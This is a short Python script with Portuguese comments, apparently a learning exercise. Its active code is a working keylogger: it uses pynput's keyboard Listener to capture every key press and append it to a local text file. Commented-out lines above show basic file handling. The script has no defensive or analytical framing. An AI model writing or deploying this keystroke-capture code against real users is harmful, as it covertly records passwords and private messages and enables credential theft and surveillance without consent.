# registrar as teclas em um arquivo de texto
# r - reading
# w - write sobre escreve o arquivo
# a - append adiciona ao texto  ( pular de linha '\n' antes ou depois da string)
# criar um arquivo
###f = open("log.txt", 'a')
##filedata = f.read()
##print(filedata)
###f.write("\n teste linha")
###f.close()

from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'","") #tira as aspas ' q cria automaticamente
    with open("letras.txt", 'a') as f:         #usando with por razoes de alocaão de memoria
        f.write(letter)

with Listener(on_press=writetofile) as l:   # with; on_press ativa a função writetofile; as l verbaliza a linha para facilitar o uso
    l.join()